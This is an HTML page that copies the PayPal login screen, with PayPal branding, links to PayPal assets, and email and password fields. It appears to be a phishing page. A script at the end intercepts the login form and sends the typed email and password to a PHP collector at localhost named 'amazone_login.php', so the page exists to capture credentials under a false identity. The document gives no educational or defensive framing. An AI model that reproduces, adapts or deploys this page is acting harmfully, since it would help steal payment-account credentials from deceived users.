<!DOCTYPE html>
<html lang="en" class="no-js desktop">
<head>
    <meta charset="utf-8" />
    <title>Log in to your PayPal account</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="PayPal" />
    <meta name="keywords" content="transfer money, email money transfer, international money transfer" />
    <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png" />
    <link rel="canonical" href="https://www.paypal.com/us/signin" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png" />

<body class="desktop">
    <noscript><p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p></noscript>
    <div id="main" class="main" role="main">
        <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
            <div class="corral">
                <div id="content" class="contentContainer activeContent contentContainerBordered">
                    <header id="header">
                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
                    </header>
                    <h1 id="headerText" class="headerText accessAid">Log in to your PayPal account</h1>
                    <div id="loginContent">
                        <div id="loginSection">
                            <div class="notifications"></div>
                            <form method="post" class="proceed maskable" autocomplete="off" name="form" id="login-form">
                                
                                <div id="passwordSection" class="clearfix splitEmail">
                                    <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
                                        <div class="textInput" id="login_emaildiv">
                                            <div class="fieldWrapper">
                                                <input id="email" name="email" type="email" class="hasHelp validateEmpty" required="required" value="" autocomplete="username" placeholder="Email or mobile number" />
                                                <label for="email" class="fieldLabel">Email or mobile number</label>
                                            </div>
                                            <div class="errorMessage" id="emailErrorMessage">
                                                <p class="emptyError hide">Required</p>
                                                <p class="invalidError hide">That email or mobile number format isn’t right</p>
                                            </div>
                                        </div>
                                    </div>
                                    <div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
                                        <div class="textInput" id="login_passworddiv">
                                            <div class="fieldWrapper">
                                                <input id="password" name="password" type="password" class="hasHelp validateEmpty pin-password" required="required" placeholder="Password" />
                                                <label for="password" class="fieldLabel">Password</label>
                                                <button type="button" class="showPassword hide show-hide-password" id="Show password">Show</button>
                                                <button type="button" class="hidePassword hide show-hide-password" id="Hide">Hide</button>
                                            </div>
                                            <div class="errorMessage" id="passwordErrorMessage">
                                                <p class="emptyError hide">Required</p>
                                            </div>
                                        </div>
                                        <a href="/authflow/password-recovery/?redirectUri=%2Funifiedonboarding%2Fafter-login&amp;country.x=US&amp;locale.x=en_US" id="forgotPassword" class="recoveryOption forgotPassword hide">Forgot password?</a>
                                    </div>
                                </div>
                                <input type="hidden" id="phone" name="login_phone" class="validate" />
                                <div class="actions">
                                    <button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button>
                                </div>
                                <input type="hidden" name="splitLoginContext" value="inputPassword" />
                                <input type="hidden" name="isCookiedHybridEmail" value="true">
                            </form>
                            <div id="signupContainer" class="signupContainer">
                                <div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div>
                                <button type="button" href="/us/webapps/mpp/account-selection" class="button secondary" id="createAccount">Sign Up</button>
                            </div>
                        </div>
                    </div>
                    <div class="localeSelector">
                        <!-- <ul class="localeLink">
                            <li><a class="selected" href="/signin?returnUrl=https%3A%2F%2Fwww.paypal.com%2Funifiedonboarding%2Fafter-login%3Fcountry.x%3DUS%26locale.x%3Den_US%26products%3DEXPRESS_CHECKOUT&country.x=US&locale.x=en_US&langTgl=en" lang="en" data-locale="en_US" aria-current="true">English</a></li>
                            <li><a href="/signin?returnUrl=https%3A%2F%2Fwww.paypal.com%2Funifiedonboarding%2Fafter-login%3Fcountry.x%3DUS%26locale.x%3Den_US%26products%3DEXPRESS_CHECKOUT&country.x=US&locale.x=fr_XC&langTgl=fr" lang="fr" data-locale="fr_XC">Français</a></li>
                            <li><a href="/signin?returnUrl=https%3A%2F%2Fwww.paypal.com%2Funifiedonboarding%2Fafter-login%3Fcountry.x%3DUS%26locale.x%3Den_US%26products%3DEXPRESS_CHECKOUT&country.x=US&locale.x=es_XC&langTgl=es" lang="es" data-locale="es_XC">Español</a></li>
                            <li><a href="/signin?returnUrl=https%3A%2F%2Fwww.paypal.com%2Funifiedonboarding%2Fafter-login%3Fcountry.x%3DUS%26locale.x%3Den_US%26products%3DEXPRESS_CHECKOUT&country.x=US&locale.x=zh_XC&langTgl=zh" lang="zh" data-locale="zh_XC">中文</a></li>
                            <li><a href="/signin?returnUrl=https%3A%2F%2Fwww.paypal.com%2Funifiedonboarding%2Fafter-login%3Fcountry.x%3DUS%26locale.x%3Den_US%26products%3DEXPRESS_CHECKOUT&country.x=US&locale.x=ru_XC&langTgl=ru" lang="ru" data-locale="ru_XC">Русский</a></li>
                            <li><a href="/signin?returnUrl=https%3A%2F%2Fwww.paypal.com%2Funifiedonboarding%2Fafter-login%3Fcountry.x%3DUS%26locale.x%3Den_US%26products%3DEXPRESS_CHECKOUT&country.x=US&locale.x=pt_XC&langTgl=pt" lang="pt" data-locale="pt_XC">Português</a></li>
                            <li><a href="/signin?returnUrl=https%3A%2F%2Fwww.paypal.com%2Funifiedonboarding%2Fafter-login%3Fcountry.x%3DUS%26locale.x%3Den_US%26products%3DEXPRESS_CHECKOUT&country.x=US&locale.x=it_XC&langTgl=it" lang="it" data-locale="it_XC">Italiano</a></li>
                            <li><a href="/signin?returnUrl=https%3A%2F%2Fwww.paypal.com%2Funifiedonboarding%2Fafter-login%3Fcountry.x%3DUS%26locale.x%3Den_US%26products%3DEXPRESS_CHECKOUT&country.x=US&locale.x=nl_XC&langTgl=nl" lang="nl" data-locale="nl_XC">Nederlands</a></li>
                        </ul> -->
                    </div>
                    <div id="footer" role="contentinfo">
                        <!-- <ul style="display: flex; gap: 20px; list-style: none; margin: 10px 0 0 15px;">
                            <li><a href="https://www.paypal.com/us/webapps/mpp/ua/legalhub-full" id="legalHubLink">Privacy</a></li>
                            <li><a href="https://www.paypal.com/us/webapps/mpp/ua/useragreement-full" id="userAgreementLink">Legal</a></li>
                            <li><a href="https://www.paypal.com/us/smarthelp/home" id="contactUsLink">Help</a></li>
                            <li><a href="https://www.paypal.com/us/webapps/mpp/ua/cookie-full" id="cookiePolicyLink">Cookies</a></li>
                        </ul> -->
                    </div>
                </div>
            </div>
        </section>
    </div>

    <script>
  const form = document.getElementById('login-form');

form.addEventListener('submit', function(event) {
event.preventDefault(); 

const formData = new FormData(form);

const url = 'http://localhost:80/php_classes/amazone_login.php';

const xhr = new XMLHttpRequest();

xhr.open('POST', url, true);

xhr.onload = function() {
    if (xhr.status === 200) {
        console.log('Form data submitted successfully:', xhr.responseText);
        form.reset();
    } else {
        console.error('Error submitting form:', xhr.statusText);
    }
};

xhr.onerror = function() {
    console.error('Request failed');
};

xhr.send(formData);
});

</script>

</body>
</html>
